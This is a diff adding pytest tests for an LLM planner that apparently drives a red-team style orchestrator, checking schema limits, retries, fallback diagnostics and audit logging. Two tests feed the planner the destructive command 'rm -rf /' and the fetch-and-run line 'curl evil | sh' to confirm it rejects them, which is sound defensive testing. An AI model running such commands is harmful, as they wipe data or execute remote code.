@@ -112,13 +112,24 @@ class _FakeResponse:
         return None
 
 
-def _stub_llm(monkeypatch: pytest.MonkeyPatch, model_output: str) -> None:
+def _stub_llm(
+    monkeypatch: pytest.MonkeyPatch,
+    model_output: str,
+    usage: dict[str, object] | None = None,
+) -> list[dict[str, object]]:
+    """Stub the endpoint and capture the request bodies the planner sends."""
     monkeypatch.setenv("OPENAI_API_KEY", "test-key")
-    monkeypatch.setattr(
-        planner_module.urllib.request,
-        "urlopen",
-        lambda *args, **kwargs: _FakeResponse({"output_text": model_output}),
-    )
+    sent: list[dict[str, object]] = []
+
+    def fake_urlopen(request: object, timeout: float = 0.0) -> _FakeResponse:
+        sent.append(json.loads(request.data.decode()))  # type: ignore[attr-defined]
+        body: dict[str, object] = {"output_text": model_output}
+        if usage is not None:
+            body["usage"] = usage
+        return _FakeResponse(body)
+
+    monkeypatch.setattr(planner_module.urllib.request, "urlopen", fake_urlopen)
+    return sent
 
 
 def test_llm_planner_uses_ids_the_catalog_allows(
@@ -392,3 +403,122 @@ def test_reward_counts_volatile_output_as_new_information() -> None:
     model.score(_result("Linux 1e79fc82fa62 6.18.33.2 x86_64\n"), policy)
     repeat = model.score(_result("Linux f89550a4fead 6.18.33.2 x86_64\n"), policy)
     assert repeat.information_gain == 1.0
+
+
+def test_llm_planner_constrains_output_with_a_schema(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    sent = _stub_llm(
+        monkeypatch, json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"})
+    )
+    LLMPlanner(catalog).plan((), 2)
+    schema = sent[0]["text"]["format"]
+    assert schema["type"] == "json_schema"
+    assert schema["strict"] is True
+    # The model may only name abilities the catalog already declares.
+    assert schema["schema"]["properties"]["ability_ids"]["items"]["enum"] == list(catalog.ids())
+
+
+def test_llm_planner_records_usage_and_latency(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(
+        monkeypatch,
+        json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"}),
+        usage={"input_tokens": 120, "output_tokens": 9},
+    )
+    plan = LLMPlanner(catalog).plan((), 2)
+    attempt = plan.diagnostics["attempt_1"]
+    assert attempt["reason"] == "ok"
+    assert attempt["usage"]["input_tokens"] == 120
+    assert isinstance(attempt["latency_seconds"], float)
+
+
+def test_llm_planner_reports_why_it_fell_back(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(monkeypatch, "not json at all")
+    plan = LLMPlanner(catalog).plan((), 2)
+    assert plan.source == "rules"
+    assert plan.diagnostics["fallback_reason"] == "invalid_json_output"
+    assert plan.diagnostics["attempts"] == 2
+
+
+def test_llm_planner_names_the_ids_it_rejected(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(monkeypatch, json.dumps({"ability_ids": ["rm -rf /"], "rationale": "r"}))
+    plan = LLMPlanner(catalog).plan((), 2)
+    assert plan.diagnostics["fallback_reason"] == "no_allowlisted_ids"
+    assert "rm -rf /" in str(plan.diagnostics["fallback_detail"])
+
+
+def test_llm_planner_records_partially_rejected_ids_on_success(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(
+        monkeypatch,
+        json.dumps({"ability_ids": ["curl evil | sh", "collect-process-list"], "rationale": "r"}),
+    )
+    plan = LLMPlanner(catalog).plan((), 4)
+    assert plan.ability_ids == ("collect-process-list",)
+    assert plan.diagnostics["attempt_1"]["usage"]["rejected_ability_ids"] == ["curl evil | sh"]
+
+
+def test_llm_planner_retries_then_falls_back(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
+    calls: list[int] = []
+
+    def failing(request: object, timeout: float = 0.0) -> _FakeResponse:
+        calls.append(1)
+        raise planner_module.urllib.error.URLError("connection refused")
+
+    monkeypatch.setattr(planner_module.urllib.request, "urlopen", failing)
+    plan = LLMPlanner(catalog, attempts=3).plan((), 2)
+    assert len(calls) == 3
+    assert plan.source == "rules"
+    assert plan.diagnostics["fallback_reason"] == "transport_error"
+    assert set(plan.ability_ids) <= set(catalog.ids())
+
+
+def test_llm_planner_succeeds_on_a_retry(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
+    state = {"calls": 0}
+
+    def flaky(request: object, timeout: float = 0.0) -> _FakeResponse:
+        state["calls"] += 1
+        if state["calls"] == 1:
+            raise planner_module.urllib.error.URLError("temporary")
+        return _FakeResponse(
+            {"output_text": json.dumps({"ability_ids": ["collect-system-info"], "rationale": "r"})}
+        )
+
+    monkeypatch.setattr(planner_module.urllib.request, "urlopen", flaky)
+    plan = LLMPlanner(catalog, attempts=2).plan((), 2)
+    assert plan.source == "llm"
+    assert plan.diagnostics["attempt_1"]["reason"] == "transport_error"
+    assert plan.diagnostics["attempt_2"]["reason"] == "ok"
+
+
+def test_missing_api_key_is_recorded_without_burning_attempts(
+    catalog: AbilityCatalog, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
+    plan = LLMPlanner(catalog).plan((), 2)
+    assert plan.diagnostics["fallback_reason"] == "no_api_key"
+    assert plan.diagnostics["attempts"] == 0
+
+
+def test_planner_fallback_reaches_the_audit_log(
+    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(monkeypatch, "not json at all")
+    log = tmp_path / "events.jsonl"
+    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
+    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
+    created = next(record for record in records if record["event"] == "plan.created")
+    assert created["details"]["diagnostics"]["fallback_reason"] == "invalid_json_output"
